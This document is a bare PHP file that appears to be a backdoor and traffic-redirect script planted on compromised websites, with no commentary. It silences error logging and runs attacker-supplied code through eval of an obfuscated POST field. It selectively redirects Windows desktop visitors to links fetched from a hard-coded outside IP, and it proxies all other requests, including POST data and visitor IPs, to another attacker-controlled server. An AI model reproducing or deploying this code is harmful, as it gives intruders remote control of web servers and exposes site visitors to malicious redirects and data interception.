<?php


$host = '213.133.123.43';


@error_reporting(0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);
@ini_set("error_log", 0);

if (isset($_GET['r'])) die($_GET['r']);

if (isset($_POST['e']) && !empty($_POST['e']))
{
	eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
	exit();
}

if (isset($_GET['sid']))
{
	$cache = 'link.cache';
	$flock = 'link.flock';
	$hosts = 'hosts.txt';

	if
	(
		strlen($_SERVER["HTTP_REFERER"]) < 10 ||
		!preg_match("/Windows/", $_SERVER["HTTP_USER_AGENT"]) ||
		preg_match('/(windows ce)|(Polaris)|(Pocket)|(Dolfin)|(Obigo)|(Alcatel)|(Kindle)|(Motorola)|(Blazer)|(Symbian)|(SonyEricsson)|(Android)|(Palm)|(blackberry)|(Nokia)|(SAMSUNG)|(Mobile)|(Mobi)|(Mini)|(WAP)|(phone)|(iPhone)|(iPad)|(iPod)|(tablet)|(hiptop)|(netfront)|(uZard)|(TeaShark)|(ucweb)|(Tear)|(Skyfire)|(UP\.Browser)|(UPG1)|(Fennec)/i',$_SERVER['HTTP_USER_AGENT']) ||
		preg_match('/(java)|(windows 95)|(windows 98)|(windows me)|(win9)|(win 9)|(windows nt 4)|(MSIE 5)/i',$_SERVER['HTTP_USER_AGENT'])
	)
	{
		exit;
	}

	$ips = @explode("\n", trim(@file_get_contents($hosts)));

	if (@in_array($_SERVER['REMOTE_ADDR'], $ips)) exit;

	$ips[] = $_SERVER['REMOTE_ADDR'];

	if (count($ips) > 3000) $ips = array_slice($ips, 1);

	$fp = @fopen ($hosts, 'w');
	@flock($fp, LOCK_EX);
	@fputs($fp, implode("\n", $ips));
	@flock($fp, LOCK_UN);
	@fclose($fp);

	$link = @file_get_contents($cache);

	if (time()-@filemtime($flock) > 10) @unlink($flock);

	if (time()-@filemtime($cache) > 60 && !@file_exists($flock))
	{
		$fp = @fopen ($flock, 'w');
		@flock($fp, LOCK_EX);
		@fputs($fp, time());
		@flock($fp, LOCK_UN);
		@fclose($fp);

		$link = @file_get_contents('http://88.198.28.38/api.php?action=link&aid=1&fid=3516&hash=aca7f10053880cd0e83a6ebbb98d65f63834545a');

		@unlink($flock);

		if (strlen($link) > 20)
		{
			$fp = @fopen ($cache, 'w');
			@flock($fp, LOCK_EX);
			@fputs($fp, $link);
			@flock($fp, LOCK_UN);
			@fclose($fp);
		}
	}

	header ('Location: ' . $link);
	exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_VERBOSE, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'http://' . $host . $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_TIMEOUT, 7);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	
	'X-Server-IP: ' . $host,
	'X-Real-IP: ' . $_SERVER['REMOTE_ADDR'],
	'X-Real-Host: ' . $_SERVER['HTTP_HOST'],
	'X-Real-Request-Uri: ' . urlencode($_SERVER['REQUEST_URI']),
	
));

if (count($_POST) > 0)
{
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $_POST);
}

$page = curl_exec($ch);
$err  = curl_errno($ch);


header('X-Curl-Errno: ' . $err);


if ($err == 0)
{
	
	$page = str_replace ("HTTP/1.1 100 Continue\r\n\r\n", '', $page);
	
	list($pageHeaders, $pageData) = explode("\r\n\r\n", $page, 2);
	
	$pageHeadersArr = explode("\r\n", trim($pageHeaders));
	foreach ($pageHeadersArr AS $header)
	{
		
		if (preg_match('/^HTTP\/1[.][01] 404/Usi', $header)) header($header);
		if (preg_match('/^Location/Usi', $header)) header($header);
		if (preg_match('/^Expires/Usi', $header)) header($header);
		if (preg_match('/^Cache-Control/Usi', $header)) header($header);
		if (preg_match('/^Pragma/Usi', $header)) header($header);
		if (preg_match('/^Content-Transfer-Encoding/Usi', $header)) header($header);
		if (preg_match('/^Content-Length/Usi', $header)) header($header);
		if (preg_match('/^Content-Disposition/Usi', $header)) header($header);
		if (preg_match('/^Content-Type/Usi', $header)) header($header);
		if (preg_match('/^X-Data-MD5/Usi', $header)) header($header);
		
	}
	
	print $pageData;
	
}

curl_close($ch);

?>